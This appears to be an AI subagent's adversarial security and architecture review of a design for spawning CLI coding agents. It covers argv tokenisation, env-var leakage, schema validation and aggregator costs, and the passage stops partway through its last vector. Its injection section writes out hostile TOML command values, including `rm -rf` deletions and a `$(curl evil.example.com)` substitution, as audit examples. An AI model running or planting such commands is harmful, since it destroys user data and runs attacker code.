# Drop 4c F.7.17 + F.7.18 — Architecture Falsification

**Scope:** F.7.17 (CLI adapter seam) + F.7.18 (Context aggregator) added to `workflow/drop_4c/SKETCH.md` 2026-05-04.
**Mode:** read-only adversarial review. 15 attack vectors. Per-vector verdict + evidence + mitigation.
**Reviewer:** falsification subagent.

Numbering matches the spawn-prompt vector list V1–V15 verbatim.

---

## V1 — `CLIAdapter` interface insufficiency (SSE / streaming-mismatch CLI)

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.17 commits to a 3-method shape:

```text
BuildCommand(ctx, BindingResolved, BundlePaths) (*exec.Cmd, error)
ParseStreamEvent(line []byte) (StreamEvent, error)
ExtractTerminalCost(StreamEvent) (cost float64, denials []ToolDenial, ok bool)
```

The `ParseStreamEvent(line []byte)` signature bakes in the assumption that the upstream tool emits **newline-delimited records on stdout**. Verified by the calling-side context: F.7.4 says "parse `stream.jsonl` line-by-line." Both today's `claude --output-format stream-json` and tomorrow's `codex exec --json` are JSONL, so the line-delimited assumption holds for those two — but the seam is sold as future-proof for "Cursor / Goose / others" (§F.7.17 last bullet, §238).

**Counterexample CLIs.**

- **Goose (Block's open-source agent CLI)** ships an MCP-style streaming model where the orchestration layer can connect via **SSE / WebSocket** to a long-running goose-server, NOT a per-spawn JSONL stdout stream. A line-delimited byte parser cannot consume an SSE frame (the frame boundary is `\n\n`, not `\n`, and the data field carries multi-line payloads with `data:` prefix per line).
- **Aider** emits ANSI-colored interactive prose to stdout and writes a JSON history file post-run; there is no streaming JSON event taxonomy at all — the equivalent of `permission_denials[]` and `total_cost_usd` would have to be reconstructed by tailing `~/.aider.input.history` + `~/.aider.chat.history.md`. The interface assumes terminal-event extraction from a stream; Aider has no such stream.
- **Cursor agent** (the new `cursor-agent` CLI) emits a custom protocol over stdout that's neither pure JSONL nor SSE — it's a framed binary-then-text hybrid. Even if it could be coerced to JSONL, the `terminal_reason` / `permission_denials` taxonomy is Anthropic-specific.

**Why the seam is wrong-shape.**

- `ParseStreamEvent(line []byte)` is fundamentally a **pull-from-byte-line** API. SSE and WebSocket adapters need a **push-from-frame** or **stream-iterator** API: `ConsumeStream(ctx, io.Reader) <-chan StreamEvent` or similar. Forcing the SSE adapter to fake newline framing inside its `ParseStreamEvent` requires it to buffer state across calls, which the stateless byte-line signature does not support.
- `ExtractTerminalCost` returns `(cost, denials, ok)`. This bakes in two Anthropic-specific terminal artifacts (`total_cost_usd`, `permission_denials[]`) at the cross-CLI seam. Codex emits `total_cost_usd`; Cursor agent emits per-token usage but no roll-up; Goose emits `cost_breakdown` per provider; Aider emits no cost info at all. The seam should return a generic `TerminalReport` value object that the **adapter** populates per its CLI's vocabulary, with `cost float64` and `denials []ToolDenial` as **optional pointer fields** the dispatcher gracefully degrades around.

**Mitigation.**

- Drop the `(line []byte) (StreamEvent, error)` signature in favor of `ConsumeStream(ctx, io.Reader, sink chan<- StreamEvent) error` (push model, adapter-driven framing). Line-delimited adapters loop over `bufio.Scanner` internally; SSE adapters parse `event:`/`data:` themselves; framed-binary adapters carry their own state machine.
- Replace the 3-tuple return of `ExtractTerminalCost` with a `TerminalReport struct { Cost *float64; Denials []ToolDenial; Reason string; Errors []string; Raw any }` — pointer-cost lets adapters that lack cost telemetry signal absence cleanly.
- Document the seam's **assumed adapter properties** explicitly: process-per-spawn, exit-code authoritative, stderr is not the event channel. CLIs that violate any of those (e.g. Goose's daemon mode) need a different adapter family, not a wider `CLIAdapter` interface.

---

## V2 — `command = "valv claude"` argv injection vector

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.17 line 152: `command = "valv claude"` — TOML field is a string with a literal space inside. SKETCH gives **no spec for tokenization**. The two plausible implementations differ catastrophically:

1. **`exec.Command(command, args_prefix...)`** — treats the entire `"valv claude"` as a single binary name. POSIX `execve` then asks the kernel to find a binary literally called `valv claude`. ENOENT, hard fail. This is the safe-but-broken path.
2. **`exec.Command("sh", "-c", command + " " + strings.Join(argsPrefix, " ") + " " + adapterArgv)`** — shell injection city. `command = "rm -rf ~ ; claude"` runs `rm -rf ~` before claude. `command = "claude --foo $(curl evil.example.com)"` injects whatever the attacker controls.
3. **Tokenize via `shlex` / `shellwords`** — works for the common case, but introduces a TOML-author-vs-shell-quoting impedance mismatch: `command = "valv 'my profile' claude"` — does the inner single-quote bind, or does the tokenizer split on every space?

**Repro for path 2 (the dangerous one).**

```toml
[agent_bindings.build]
command = "rm -rf $HOME/.tillsyn ; claude"
```

If template-bake passes `command` to `os/exec.Command("sh", "-c", command)`, this nukes the dev's tillsyn DB on next dispatch. The exact same TOML loaded by an `exec.Command(name, args...)` call form fails ENOENT and the dev sees a "binary not found" error. The SKETCH does not commit to either form.

**Trust-model context.** Template TOML is project-author-controlled; in the marketplace flow (§F.4), templates come from a **third-party git repo** (`github.com/evanmschultz/tillsyn-templates`). A malicious or compromised template lands as a downloaded TOML file the dispatcher reads at spawn time. Without a tokenization spec + a documented trust boundary, the marketplace is a remote-code-execution vector.

**Mitigation.**

- **Drop the string field; add a list field.** `command = "claude"` becomes `command = ["claude"]` (array of argv tokens). `command = ["valv", "claude"]` for the wrapper case. `args_prefix` already a list. The two lists concat with the adapter's argv via `exec.Command(combined[0], combined[1:]...)`. Pure list form, no tokenizer, no shell, no injection surface.
- Schema-validate `command[0]` against an allow-list policy (regex `^[a-zA-Z0-9_./-]+$`, no shell metachars) at template-load time. Fail loudly on `;`, `|`, `&`, `$`, backtick, redirect operators in any token.
- Marketplace templates additionally run through a stricter validator that rejects any `command` other than the closed set `["claude"]` or `["valv", "claude"]` (or future approved wrappers), with override only via dev's local `<project>/.tillsyn/template.toml` after explicit dev sign-off.

---

## V3 — `env` env-name forwarding leak

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.17 line 154: `env = ["TILLSYN_API_KEY", "ANTHROPIC_API_KEY"]` — list of env-var **names** to forward "via `os.Getenv` at spawn time." Crucially, the SKETCH does NOT say "and clip the orchestrator's env to ONLY these names." It says the names are forwarded.

**Go's `exec.Cmd` default semantics** (`os/exec` docs): when `cmd.Env == nil`, the child inherits `os.Environ()` wholesale. Forwarding `env = ["TILLSYN_API_KEY"]` by **appending** `"TILLSYN_API_KEY=<resolved>"` to a nil `cmd.Env` is a no-op for the inheritance path: the child still gets the orchestrator's full env.

**Counterexample.** Orchestrator runs under direnv with `AWS_ACCESS_KEY_ID=AKIA…`, `OPENAI_API_KEY=sk-…`, `ANTHROPIC_API_KEY=sk-ant-…`, `STRIPE_SECRET=…`. Template author writes:

```toml
[agent_bindings.build]
env = ["TILLSYN_API_KEY"]   # think they're being conservative
```

If the dispatcher does `cmd.Env = append(os.Environ(), "TILLSYN_API_KEY=<v>")` — the entire orchestrator env, including `AWS_ACCESS_KEY_ID` + `STRIPE_SECRET`, lands in the spawned `claude` process. Claude can then `Bash $AWS_ACCESS_KEY_ID` (subject to its own tool gating, but that's a hope-not-a-spec posture).

The SKETCH text says **"Tillsyn never holds secrets"** but never actually specifies the env-isolation primitive. The repo has the right pattern in `filteredGitEnv()` (`internal/app/git_status.go:146-156`) — strips `GIT_*` and starts from `os.Environ()` — but for a SECRET-bearing primitive the polarity is inverted: you want **deny-by-default + opt-in allow**, not **allow-by-default + opt-out deny**.

**Mitigation.**

- Spec MUST say `cmd.Env` is set to **exactly** `[PATH, HOME, USER, LANG, TZ, ...]` (a closed-enum baseline) **plus** the resolved values for each name in the binding's `env` list. `os.Environ()` is NOT inherited.
- Default baseline list lives in `internal/app/dispatcher` as a closed slice; documented; small.
- Schema-validate that `env` entries are env-var **names** only (regex `^[A-Z][A-Z0-9_]*$`), no `=`, no shell metachars. Already mentioned in the SKETCH ("rejects values containing `=`") but the concern there is "TOML editors writing `KEY=value`," not the orchestrator-env-leak.
- Add a `ProjectMetadata.dispatcher_env_allowlist []string` for project-wide additions beyond the binding's env list (e.g. `PATH` extension to find Valv).

---

## V4 — F.7.18 flexibility violation by accident

**Verdict: PASS-WITH-NIT (one accidental-mandate signal).**

**Evidence.** I read every paragraph of §F.7.18 looking for prose that smuggles "REQUIRED" past the explicit "OPTIONAL not REQUIRED" framing. Findings:

- The framing prose at the top is unambiguous: "OPTIONAL — Tillsyn supports the pattern but does not require it" (line 159), reinforced at line 184 ("Both first-class").
- The schema bullet says "all fields optional" (line 161).
- The "Why this is FLEXIBLE not REQUIRED" subsection (lines 181–184) is explicit.
- Default-template seeds for `build`, `build-qa-proof`, `build-qa-falsification`, `plan-qa-proof`, `plan-qa-falsification`, `planner` (lines 173–178) — these are presented as **defaults the project can override**, not mandatory shapes. Properly framed.

**One nit.** Line 181: "Adopters who want minimal latency + bounded context: declare the table, agent calls MCP once on completion." This **describes** the bounded-context path's runtime semantics correctly, but **co-locates** that description with the framing that says "Tillsyn supports the pattern but does not require it." The accidental implication is that the bounded path is the *recommended* path for production use cases — which contradicts the dev-quoted "we don't expect, dictate that all agents need to only be able to call mcp to update their own node." Recommend rewriting line 181 as parallel-structure to line 183 ("equally first-class, choose based on…") instead of the implicit ranking ("minimal latency + bounded context" sounds like the favored answer).

**Second nit (planner descendants validation — see V5 below).** The sentence "Schema validation rejects `descendants_by_kind` on `kind=plan`" (line 178) is one tiny piece of mandated rule, applied on the binding regardless of whether the binding has a `[context]` table. **If** a `kind=plan` binding has no `[context]` table, the rule is moot. **If** it has one, the rule fires. Since the rule fires only conditionally, it's not a flexibility violation per se — but bundling it with the planner-descendants validation makes V5's case stronger: the rule is over-specified.

**Mitigation.**

- Reword line 181 from "Adopters who want minimal latency + bounded context: declare the table" to "Adopters who declare `[context]` get bounded pre-staging + a single MCP call on completion. Adopters who omit get full agentic exploration. Choose based on cost / latency / determinism preference."
- Move the planner-descendants validation rule out of F.7.18's main paragraph into a child bullet under "Schema validation" so the reader doesn't read it as a mandatory cross-cutting constraint.

---

## V5 — Planner-descendants schema validation false positive

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.18 line 178: "Planners CANNOT have descendants pre-staged (they create them); the aggregator does NOT walk a planner's children. Schema validation rejects `descendants_by_kind` on `kind=plan`." This is a **load-time hard reject** — the template fails to load.

**Counterexample 1 — round-history planner.** A fix-planner re-plans after a previous plan's QA found gaps. Its goal: read the previous plan's children (the prior decomposition's leaves), surface what worked / what failed, propose a new decomposition. Per the SKETCH's own round-history aggregation primitive (line 179), prior rounds' artifacts can be rehydrated. But the aggregator's "walk down" primitive (`descendants_by_kind`) is the natural way to surface "every leaf the previous plan iteration produced." Hard-rejecting it at load means the fix-planner template has to either (a) hand-wire the descendants via `siblings_by_kind` on a sentinel parent (awkward) or (b) skip the aggregator and call MCP at runtime (fine, but the agentic-vs-bounded choice should be the *adopter's*, not the schema validator's).

**Counterexample 2 — tree-pruner planner.** A maintenance plan whose job is to identify orphan / stale descendants under a parent plan and route them to refinement. Reading the descendants is the entire job. The "planners can only see ancestors not descendants" rule is built around the canonical Drop 4 cascade flow but is not a domain truth.

**Counterexample 3 — multi-iteration plan with sub-plan reflection.** A plan that already created sub-plans and now wants to re-evaluate "did my decomposition cover the work?" requires walking its existing children. The aggregator could hand the planner a cached snapshot of its descendants taken at the moment the planner last ran — perfectly valid use case, hard-rejected by the schema rule.

**Why the validation is too strict.** F.7.18's framing is "FLEXIBLE not prescriptive." A hard load-time reject of a single `[context]` field on a single `kind` is the most prescriptive thing in F.7.18. It contradicts the framing.

**Mitigation.**

- Demote the rule from `error` to `warn`. Template loads with a finding: "planner with `descendants_by_kind` is unusual — verify intent (round-history fix-planner? tree-pruner?)."
- Or keep it as error in the **default template** (which does hold for the canonical decomposition flow) but allow project templates to opt out via an explicit `allow_planner_descendants = true` knob.
- Document the canonical reasoning ("planners create their descendants; reading descendants ahead of time is usually a bug") in the schema doc-comment, not at the load-time gate.

---

## V6 — Token-budget priority ambiguity

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.18 line 180: "exceeds the cap → aggregator emits warning, agent gets the largest rules first, smaller-priority rules dropped with marker." This sentence has **two simultaneous orderings** that are not reconciled:

1. "agent gets the **largest** rules first" — **largest** in what dimension? Largest size (most chars)? Largest semantic priority? Largest alphabetical? Largest TOML-declaration order?
2. "**smaller-priority** rules dropped" — implies an ordering by *priority*, not by size.

There's no `priority = N` field in the F.7.18 schema. No `order = N`. The schema's example fields (`parent`, `parent_git_diff`, `siblings_by_kind`, `ancestors_by_kind`, `descendants_by_kind`, `delivery`, `max_chars`) carry no ordering metadata.

**Two readings produce different aggregator output.**

- **Reading A — "largest" = largest size.** Aggregator sums `len(rendered)` per rule, sorts descending, fills until budget exceeded, drops the smaller rules. A 50KB git diff wins over a 100-byte parent-title block. This produces git-diff-dominated context; planner ancestors get cut.
- **Reading B — "largest" = largest priority (= smallest rule, since "smaller-priority dropped").** Aggregator sorts by some implicit priority (maybe TOML declaration order? maybe a ranking baked into the aggregator?), keeps top-priority, drops bottom. A `parent = true` flag carries higher priority than a 50KB git diff. This produces parent-dominated context; the diff gets truncated or dropped.

The two readings are operationally opposite. The SKETCH commits to neither.

**Mitigation.**

- Add an explicit `priority` field per rule. TOML map keys are unordered (go-toml v2 docs); a `priority = 100` int per rule with deterministic tie-break (alphabetical key order on tie) gives reproducible output.
- Spec the budget-overflow algorithm: "rules sorted by `priority` descending; each rule contributes its full rendered output unless its inclusion exceeds `max_context_bundle_chars`, in which case the rule is dropped wholesale (NOT truncated mid-rule) and a `[dropped: <rule_name> (would have added <N> chars)]` marker is appended."
- Add an alternate "truncate inside rule" mode opt-in: `[agent_bindings.<kind>.context.truncation] mode = "drop_whole_rule" | "truncate_in_rule"`. Default "drop_whole_rule" because mid-rule truncation produces incoherent context.

---

## V7 — Multi-CLI auth-env collision

**Verdict: REFUTED — but with a sequencing nit.**

**Evidence.** SKETCH §F.7.17 makes `env` a per-binding field (`[agent_bindings.<kind>] env = [...]`). With per-binding env, `kind=build` (claude) gets `env = ["ANTHROPIC_API_KEY"]` and `kind=research` (codex) gets `env = ["OPENAI_API_KEY"]`. They never share an env namespace. Per-binding scoping is correct.

**Trace through spawn-pipeline argv emission.**

1. Dispatcher resolves binding for `kind=research` → adapter = `codex`.
2. `binding.Env = ["OPENAI_API_KEY"]`.
3. Dispatcher computes `cmd.Env = baseline + [OPENAI_API_KEY=<resolved>]`.
4. Dispatcher hands `cmd` to codex adapter's `BuildCommand`. Codex appends `--profile`, `exec --json`, etc.
5. `cmd.Env` is set on the *exec.Cmd, not on the per-call argv. No cross-binding leak.

The architecture is correct. The two bindings are **independent rows**.

**Nit — env-NAME collision risk.** If both `claude` and `codex` happened to read the same env var (e.g. `HTTP_PROXY` or some shared `LLM_API_KEY`), and the project's `[agent_bindings.build] env = ["LLM_API_KEY"]` sets it to a claude-meant secret, the codex spawn (different binding, different `env` list) won't see it — fine. But if a future dev adds `[agent_bindings.research] env = ["LLM_API_KEY"]` thinking it's their codex secret, and the orchestrator's `LLM_API_KEY` is currently set to the claude key (because the dev's shell has one, not two), the codex spawn gets the wrong secret. This isn't a Tillsyn bug — it's an adopter-config bug — but the SKETCH could surface it: "env names are case-sensitive; if two bindings reference the same name they read the SAME orchestrator env value."

**Mitigation.**

- Document the env-name shared-namespace property in the F.7.17 schema doc-comment.
- (Optional) at template-load time, if two bindings share an `env` name AND have different `command` entries, emit a finding: "build (claude) and research (codex) both read `LLM_API_KEY`; verify both CLIs expect the same secret format."

---

## V8 — `[agent_bindings.<kind>.context]` schema collision with existing `Tools` field

**Verdict: REFUTED.**

**Evidence.** Read `internal/templates/schema.go:285-332` (the current `AgentBinding` struct). Existing fields:

```go
AgentName, Model, Effort string
Tools []string
MaxTries, MaxTurns int
MaxBudgetUSD float64
AutoPush bool
CommitAgent string
BlockedRetries int
BlockedRetryCooldown Duration
```

There is no existing `Context` field, no `Command` field, no `ArgsPrefix` field, no `Env` field. F.7.17's additions (`command`, `args_prefix`, `env`, `cli_kind`) and F.7.18's `[context]` table do not collide with any current TOML key in `AgentBinding`.

**TOML scalar-vs-table collision risk.** TOML disallows the same key being both a scalar and a table within the same table. F.7.18 adds `context` as a sub-table:

```toml
[agent_bindings.build.context]
parent = true
```

For collision, there'd have to be a current scalar `context = "..."` field on `AgentBinding`. There isn't. Same for F.7.17's additions: `command` (scalar), `args_prefix` (array), `env` (array), `cli_kind` (scalar) — none collide.

**Forward-compat caveat.** If any future drop adds an `AgentBinding.Context string` scalar, it'd collide with F.7.18's table. Schema-version pinning (`SchemaVersionV1`) catches that — F.7.18 should bump to `SchemaVersionV2` if it's a breaking-shape change, or at least reserve the scalar `context` key as forbidden going forward.

**Mitigation (defensive, not blocking).**

- Add a comment in `schema.go` reserving the names `command`, `args_prefix`, `env`, `cli_kind`, `context` so a future field-add doesn't accidentally re-use one.
- Bump `SchemaVersionV1` → `SchemaVersionV2` when F.7.17 + F.7.18 land. Existing `default-go.toml` and `default.toml` author `schema_version = "v2"`. Templates pinned to v1 fail loudly to load post-Drop-4c — but this is fine because there are no third-party v1 templates in production yet (pre-MVP).

---

## V9 — Drop 4d sequencing impossibility

**Verdict: PASS-WITH-NIT.**

**Evidence.** SKETCH says Drop 4d is ~7–10 droplets, "post-Drop-4c-merge, pre-Drop-5 dogfood" (line 157). Drop 4c is 38–50 droplets (line 238). Drop 5 is "dogfood validation."

**Three valid orderings exist; SKETCH doesn't pick.**

- **A — strict sequence (SKETCH default).** 4c (38–50 droplets) → 4d (7–10) → 5 (dogfood). Total pre-dogfood time: longest. Lowest risk because F.7.17 seam exists + claude adapter dogfooded before codex lands.
- **B — parallel.** 4c.first-half (F.7.17 seam lands at maybe droplet 12–15 of 4c) → fork: 4c.second-half + 4d run in parallel → both merge → 5. Earliest dogfood, lowest blocking. Highest risk: 4d builds on a seam that's still settling.
- **C — claude-only Drop 5, then 4d.** 4c → 5 (claude-only dogfood, validates F.7.17 seam under load) → 4d (codex adapter, addresses any seam-rough-edges 5 surfaced). Earliest learning signal; pushes second-CLI dogfood later. Lowest risk for dogfood readiness.

**Argument for option C.** F.7.17's stated value is "architects the spawn pipeline for multi-CLI extensibility WITHOUT shipping the second adapter inside Drop 4c." The seam can be **validated** on a single CLI (claude) — does dogfood actually exercise the abstraction boundary? Probably not, since dogfood-validation focuses on the cascade-on-itself loop, not multi-CLI. Adding codex pre-dogfood means dogfooding is **also** a first-time codex-integration test, which conflates two risk vectors. Splitting them is sounder.

**Argument for option A (SKETCH default).** "First Tillsyn dogfood loop should validate the multi-CLI thesis end-to-end." Reasonable but optimistic — most real-world risk in dogfood is the cascade flow itself (auth, gates, conflict detection), not the LLM adapter.

**Mitigation.**

- Capture the sequencing decision explicitly at full-planning time. Don't leave "Drop 4d post-4c-merge, pre-Drop-5" as the only stated option.
- Recommend option C: Drop 5 dogfoods claude-only; Drop 4d follows; Drop 5.5 (or 6) is "second-CLI dogfood validation."
- F.7.17 seam validation is internal-correctness (interface separation, no claude-isms leaking into shared code) — testable by a `MockAdapter` in 4c without needing a second real adapter at all.

---

## V10 — Aggregator runtime cost (deep ancestor walk)

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.18 default-template seeds (line 174): "build: parent + parent_git_diff + plan ancestor (delivery=file)." Plan ancestor walk uses `ancestors_by_kind = ["plan"]`, which the aggregator interprets as "walk up the tree to the first matching ancestor."

**Failing case.** Action item tree is 6 levels deep:

```
project (level 0)
└─ plan (level 1, drop)
   └─ plan (level 2, segment)
      └─ plan (level 3, segment)
         └─ plan (level 4, segment)
            └─ plan (level 5, confluence)
               └─ build (level 6, droplet)  ← spawning this
```

Aggregator walks from `build` upward: read parent (level 5 plan) → check kind, not match? No, it's plan, match → done after 1 read. **Wait** — `ancestors_by_kind = ["plan"]` per F.7.18 line 169 / 178 says walk up to first matching ancestor. Re-reading: "plan ancestor" (line 174) means **the first plan ancestor**, which is the immediate parent in this tree. **One read.**

But what if the rule is `ancestors_by_kind = ["plan", "drop"]` (walk up to either)? Or what if the build's parent is a `confluence` (not a plan)? Then the walk continues until hitting a plan. In a deep tree that's N reads.

**Worst case.** A `build` action item nested under 5 segments of plans (deep decomposition):

- read parent (plan) — match? hmm depends. If `ancestors_by_kind = ["plan"]` matches *any* plan, it stops at the first one. **N=1 read.**
- If `ancestors_by_kind = ["plan@root"]` (a hypothetical "walk to the topmost plan" semantic), need to walk to level 1 — **N=5 reads**.

The SKETCH does NOT specify "first-match" vs "all-matches" vs "topmost-match" semantics.

**Worse case — `siblings_by_kind`.** F.7.18 line 166: `siblings_by_kind = ["build-qa-proof", "build-qa-falsification"]  # latest round only`. "Latest round" means walking the parent's children, finding the most-recent QA pair, dereferencing each. Three reads minimum (parent, qa-proof, qa-falsification). For "all rounds" (which the bullet rejects), it'd be N rounds × 2 each.

**Combined.** A single build spawn aggregator runs:

- 1 read for parent (the immediate plan).
- 1 read for parent's git diff (filesystem op, not Tillsyn read).
- N reads for ancestor walk (worst-case 5 in a deep tree).
- 3 reads for siblings (QA pair).
- M reads for round-history (`include_round_history = true` in worst case).

Each read goes through Tillsyn MCP → SQLite. SQLite single-thread WAL mode handles ~10k reads/sec on a modern SSD, but each MCP roundtrip serializes JSON-RPC, hits the SQLite cache, deserializes. Realistic per-read latency: 1–5ms. 10 reads = 10–50ms pre-spawn overhead. Not catastrophic but noticeable for a per-spawn aggregator.

**Cap missing.** SKETCH has `max_chars = 50000` per rule and `max_context_bundle_chars = 200000` overall, but **no cap on ancestor walk depth**, no cap on rule-fire count, no cap on aggregator wall-clock time.

**Mitigation.**

- Spec ancestor-walk semantics: "first-match" is the default; `ancestors_by_kind = ["plan@root"]` for topmost (with explicit `@root` qualifier).
- Add `[agent_bindings.<kind>.context.limits] max_ancestor_depth = 10`, `max_aggregator_duration = "500ms"`. Aggregator hits limit → emits warning, drops remaining rules with `[truncated: aggregator hit max_ancestor_depth]` marker.
- Default `max_aggregator_duration = "2s"` — enough for typical depths, fails loud if the tree is pathological.

---

## V11 — No-OAuth-in-Tillsyn handwave (Valv-not-installed error UX)

**Verdict: CONFIRMED.**

**Evidence.** SKETCH §F.7.17 line 152: "Adopters who want Docker isolation install Valv separately and point Tillsyn at the wrapper." The integration is `command = "valv claude"`. SKETCH says nothing about what happens when `valv` is not on `$PATH`.

**Default Go behavior.** `exec.Command("valv", ...)` calls `LookPath("valv")` which returns `*exec.Error{Err: exec.ErrNotFound}`. When `cmd.Start()` is invoked, the error surfaces as `exec: "valv": executable file not found in $PATH`. Default error rendering at the dispatcher level (per `internal/app/dispatcher/spawn.go:152-165`) wraps this in a `BuildSpawnCommand` error — the dev sees a generic "spawn failed" with the nested executable-not-found message.

**Failing case.** Dev installs Tillsyn, finds the SKETCH/marketplace template that uses `command = "valv claude"`, runs `till dispatcher run --action-item <id>`. Dispatcher emits:

```
dispatcher: spawn failed: exec: "valv": executable file not found in $PATH
```

Dev does not know:

- That Valv is a separate tool (not bundled with Tillsyn).
- That the template they're using assumes Valv.
- Whether they should install Valv, or change the template to `command = "claude"`.
- Where to find Valv install instructions.

The SKETCH carries the architectural commitment ("Tillsyn never holds secrets, no Docker awareness") but ducks the user-experience implication.

**Mitigation.**

- At template-load time, run `LookPath(binding.Command[0])` (after V2's tokenization fix). If not found, emit a finding (warn-only; dev's PATH may be tooled differently from the orchestrator's): `template references binary "valv" not found in $PATH; install per https://valv.example.com or override command = ["claude"] for un-isolated mode`.
- At spawn time, on `exec.ErrNotFound`, surface a structured error: `dispatcher: command %q not found in $PATH; (template specifies command = %v)`. Include guidance.
- Document the Valv install path in `~/.tillsyn/template-template.toml` (a sample template) and link from the F.7.17 schema doc-comment.

---

## V12 — YAGNI on F.7.18 round-history

**Verdict: CONFIRMED (gold-plating risk).**

**Evidence.** SKETCH §F.7.18 line 179: "Round-history aggregation for fix-builder loops: if `metadata.spawn_history[]` non-empty, the aggregator MAY include prior round's stream-json terminal events under `<bundle>/context/round_history/round_<N>.json`." Optional, declared via `include_round_history = true`.

**The actually-existing fix-builder pattern.** Per the project's drop-4a/4b history:

- Builder fails → action item moves to `failed` with `metadata.failure_reason`.
- Orch (or future dispatcher) reads `failure_reason` + the worklog MD + the failing test output + the QA findings to assemble the next-round prompt.
- The "previous round's stream-json terminal events" is ONE source among ~5; not the dominant one.

**What's actually load-bearing for fix-builder.**

1. Worklog MD content (durable, hand-curated by builder mid-run). **Highest signal.**
2. Failing test output (stderr capture from `mage ci` gate). **High signal.**
3. QA-twin findings comments (the "what failed" diagnostic). **High signal.**
4. `metadata.failure_reason` (one-line summary). **Medium signal.**
5. Prior `total_cost_usd` (for budget-aware retries). **Low signal — useful for `dispatcher_max_total_cost` ceiling but not for re-prompting.**
6. Prior `permission_denials[]` (what tools the previous builder tried that got denied). **Low-medium signal — useful but already covered by item 3 if the QA twin captures it.**

The SKETCH's `round_history/round_<N>.json` carries items 5 + 6 + the raw event stream. Items 1–4 (the load-bearing ones) come from elsewhere (worklog, gate output, QA comments).

**YAGNI argument.** Round-history aggregation is a generic primitive that surfaces the **least useful** of the fix-builder signals. It costs implementation effort (per-spawn JSON capture, file layout, schema), and the high-value signals (worklog, gate output, QA findings) need their own aggregator wires regardless. Round-history adds surface area without solving the actual "what does fix-builder need" problem.

**Mitigation.**

- Drop `include_round_history` from F.7.18's initial scope. Keep `metadata.spawn_history[]` as F.7.9's audit trail (cost, denials, terminal_reason — for ledger / dashboard, not for re-prompting).
- Address fix-builder context separately via dedicated aggregator rules: `prior_round_worklog = true` (reads `<bundle>/round-N/worklog.md`), `prior_round_gate_output = true`, `prior_round_qa_findings = true`. Higher-signal, more YAGNI-aligned.
- Defer round-history aggregation until there's a concrete use case where the raw stream-json events are needed and worklog/gate-output isn't enough.

---

## V13 — `[context]` nesting overhead at scale

**Verdict: REFUTED — provided the aggregator is per-binding, not per-template.**

**Evidence.** SKETCH §F.7.18 line 172: "Aggregator engine lives in new `internal/app/dispatcher/context/` package. Pure-function `Resolve(binding, item, repo) (Bundle, error)`." The signature `Resolve(binding, item, repo)` takes a SINGLE binding — the binding for the kind being spawned. It does NOT iterate over all bindings in the catalog.

**Trace.** Project has 12 kinds × 6 context rules each = 72 rules total in the template. At spawn time:

1. Dispatcher resolves `item.Kind` (say `build`).
2. Looks up binding for `build` (1 catalog read, in-memory).
3. Calls `Resolve(buildBinding, item, repo)`.
4. Aggregator iterates the **6 rules on the build binding only**. Other 11 bindings (and their 66 rules) are not touched.

**Per-spawn cost** = O(rules on the spawning kind's binding) = ~6 SQLite reads + ~6 file reads + git diff capture. Not 72.

**Possible failure modes that AREN'T this attack.**

- If the aggregator naively iterates `template.AgentBindings` and applies each kind's `[context]` to every spawn — that'd be 72 evaluations. SKETCH does not say this; the `Resolve(binding, ...)` signature implies per-binding scope.
- If a single `[context]` table fans out to many tree reads (V10 attack — ancestor walk depth), that's a separate concern.

**Mitigation.**

- Add a doc-comment in the aggregator's `Resolve` signature: "this function is scoped to the supplied binding's rules only. Other bindings in the same template are not consulted; the caller is the dispatcher and must call once per spawn."
- Optionally write a benchmark fixture (`Benchmark_Resolve_72rules_acrosskinds`) that validates O(rules-on-spawning-kind) not O(all-rules-in-template).

---

## V14 — F.7.17 + F.7.18 timing dependency (cross-cutting schema landing)

**Verdict: CONFIRMED.**

**Evidence.** SKETCH says both F.7.17 and F.7.18 land in Drop 4c, but the dependency direction is one-way: **F.7.18's default-template seeds reference `agent_bindings.<kind>.context = ...`** (lines 174–178), which uses the `agent_bindings` table that F.7.17 widens with `command` / `args_prefix` / `env` / `cli_kind`.

**Failure case.** Drop 4c plan splits F.7.17 into ~5 droplets and F.7.18 into ~6 droplets. Planner orders them as F.7.18 first (context aggregator, more user-facing), F.7.17 second (CLI seam, internal). At droplet 4c.X (F.7.18 lands the default-template seeds), the template now has:

```toml
[agent_bindings.build]
agent_name = "go-builder-agent"
model = "opus"
[agent_bindings.build.context]
parent = true
parent_git_diff = true
ancestors_by_kind = ["plan"]
```

Schema validator runs at template-load: validates all known fields. F.7.17 has not landed yet, so `command` / `args_prefix` / `env` / `cli_kind` are not yet known fields; that's fine (they'd be absent from the template at this point).

**Reverse failure case.** F.7.17 lands first, F.7.18 second. F.7.17 adds `command` etc. to the schema. F.7.18 lands `[context]` seeds. Both schema additions independent — no collision. Order-independent on the schema axis.

**Real failure case — schema-version + reject-unknown-keys interaction.** Theme A's "reject unknown keys at MCP boundary" rule (SKETCH §59) extends to template-load (per F.7.18 line 185: "unknown keys rejected"). If the schema-version bump is paired with one but not both of F.7.17 + F.7.18 (e.g. v1 → v2 happens at F.7.17 landing), then F.7.18's `[context]` table loaded under v2 schema may be rejected as unknown until F.7.18's schema additions land. The SKETCH does not say how schema-version bumps coordinate with multi-droplet schema additions inside a single drop.

**Mitigation.**

- Land schema additions in **one droplet** (e.g. 4c.X "F.7 schema widening: command/args_prefix/env/cli_kind/[context] all-or-nothing"). The schema struct grows in one commit; subsequent droplets use the wider struct without re-touching the schema.
- OR keep schema additions per-droplet but bump schema-version exactly once at the END of the F.7 theme (e.g. final droplet "F.7 schema-version v1→v2 + default templates upgraded"). In-between droplets keep `SchemaVersionV1` and rely on the existing `unknown_fields` permissive behavior in go-toml v2.
- Plan-QA falsification at full-planning time should specifically attack the F.7.17 + F.7.18 schema-additions ordering.

---

## V15 — Memory-rule conflicts

**Verdict: PASS-WITH-NIT (one near-miss, two clean).**

**Evidence.** Cross-check against the four named memory rules.

**`feedback_no_migration_logic_pre_mvp.md` — clean.** F.7.17 + F.7.18 add new TOML schema fields. No migration code. Pre-MVP rule says dev fresh-DBs on schema/state changes; a `SchemaVersionV1` → `SchemaVersionV2` bump fits within "no migration code in Go" provided the fresh-DB convention covers template re-bake (it does — `internal/app/service.go` `loadProjectTemplate` reads from disk, no DB persistence of bake'd template content). **No conflict.**

